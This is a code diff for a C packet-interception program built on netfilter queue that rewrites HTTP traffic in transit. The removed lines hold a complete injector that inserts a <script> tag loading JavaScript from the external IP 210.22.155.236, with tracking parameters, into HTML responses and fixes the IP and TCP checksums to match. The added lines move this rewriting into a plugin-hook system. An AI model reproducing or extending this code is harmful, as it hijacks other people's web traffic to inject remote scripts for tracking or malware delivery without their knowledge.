@@ -1,72 +1,9 @@
 #include "main.h"
 
-//#define JS "hello world"
-#define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>"
-#define JS_LEN strlen(JS)
-#define TIMEOUT_HTTP 24*60*60
+#define TIMEOUT_HTTP 60*60
 
 struct list_head httpc_list;
 
-unsigned short in_cksum(unsigned short *addr, int len)    /* function is from ping.c */
-{
-    register int nleft = len;
-    register u_short *w = addr;
-    register int sum = 0;
-    u_short answer =0;
- 
-    while (nleft > 1)
-        {
-        sum += *w++;
-        nleft -= 2;
-        }
-    if (nleft == 1)
-        {      
-        *(u_char *)(&answer) = *(u_char *)w;
-        sum += answer;
-        }
-    sum = (sum >> 16) + (sum & 0xffff);
-    sum += (sum >> 16);
-    answer = ~sum;
-    return(answer);
-}
-
-unsigned short ip_chsum(struct iphdr *iph)
-{
-	unsigned short check;
-	iph->check=0;
-	check=in_cksum((unsigned short *)iph, sizeof(struct iphdr));
-	return check;
-}
-
-unsigned short tcp_chsum(struct iphdr *iph , struct tcphdr *tcp ,int tcp_len)
-{
-	char check_buf[BUFSIZE]={0};
-	unsigned short check;
-	
-    struct pseudo_header
-    {
-        unsigned int source_address;
-        unsigned int dest_address;
-        unsigned char placeholder;
-        unsigned char protocol;
-        unsigned short tcp_length;
-    } pseudo;
-	
-	tcp->check=0;
-
-    // set the pseudo header fields 
-    pseudo.source_address = iph->saddr;
-    pseudo.dest_address = iph->daddr;
-    pseudo.placeholder = 0;
-    pseudo.protocol = IPPROTO_TCP;
-    pseudo.tcp_length = htons(tcp_len);
-	memcpy(check_buf,&pseudo,sizeof(struct pseudo_header));
-	memcpy(check_buf+sizeof(struct pseudo_header),tcp,tcp_len);
-    check = in_cksum((unsigned short *)&check_buf, sizeof(struct pseudo_header)+tcp_len);
-	
-	return check;
-	
-}
 
 ///////////////////////////////////////////////////////////////////////
 
@@ -167,50 +104,7 @@ int update_httpc(struct http_conntrack *httpc,
 
 ///////////////////////////////////////////////////////////////
 
-int insert_code(struct _skb *skb)
-{
-    char* body;
-	int offset=0;
-    char buffer[BUFSIZE];
-	int len=0;
-	
-    if(!skb->http_head)
-		return -1;
 
-    body=strstr(skb->http_head , "</head>");
-	offset=7;
-	if(!body)
-	{
-		body=strstr(skb->http_head , "<body>");
-		offset=6;
-		if(!body)
-			return -1;
-	}
-    body=body+offset;
-	
-	len=strlen(body);
-	memcpy(buffer , skb->http_head , skb->http_len-len);
-	memcpy(buffer+(skb->http_len-len) , JS , JS_LEN);
-	memcpy(buffer+(skb->http_len-len+JS_LEN) , body , len);
-	
-  	memcpy(skb->http_head , buffer , skb->http_len+JS_LEN);
-	//body=strstr(skb->http_head , skb->hhdr.content_length);
-	//if(!body)
-	//	return -1;
-	//memcpy(body , "2952" , 4);
-	//debug_log("````````````%s\n" , skb->http_head);
-    skb->iph->tot_len=htons(skb->http_len+JS_LEN);
-    skb->iph->check=ip_chsum(skb->iph);
-
-    skb->tcp->check=tcp_chsum(skb->iph , skb->tcp , skb->tcp_len+JS_LEN);
-	skb->pload_len=skb->pload_len+JS_LEN;
-    return 0;
-}
-
-int change_url(struct _skb *skb)
-{
-	return 0;
-}
 int change_accept_encoding(struct _skb *skb)
 {	
 	char* tmp;
@@ -238,6 +132,10 @@ int dispath(struct _skb* skb)
 	{
 		case HTTP_TYPE_REQUEST_GET:
 		{
+			if(ERROR == check_plug_hook(skb , CHECK_PLUG_PRE))
+			{
+				return -1;
+			}
 			httpc=find_http_conntrack_by_host(skb);
 			if(!httpc)
 			{
@@ -269,7 +167,10 @@ int dispath(struct _skb* skb)
 			{
 				return -1;
 			}
-			insert_code(skb);
+			if(ERROR == check_plug_hook(skb , CHECK_PLUG_POST))
+			{
+				return -1;
+			}
 			return 0;			
 		}
 	}
@@ -577,11 +478,14 @@ int nfq()
     fd = nfq_fd(h);
 
     //handle a packet received from the nfqueue subsystem
+    CONTINUE:
     while ((len = recv(fd, buf, BUFSIZE, 0)) && len >= 0)
     {
         nfq_handle_packet(h, buf, len);
     }
-
+	debug_log("error len=%d" ,len);
+	sleep(2);
+	goto CONTINUE;
     nfq_destroy_queue(qh);
     nfq_close(h);
     return 0;
@@ -592,6 +496,7 @@ int main(int argc, const char *argv[])
 	INIT_LIST_HEAD(&httpc_list);
 	init_mpool(1*1024*1024);//256M
 	init_queue();
+	init_plug();
 	init_thpool(2);
 	thpool_add_job(timeout , NULL);
 
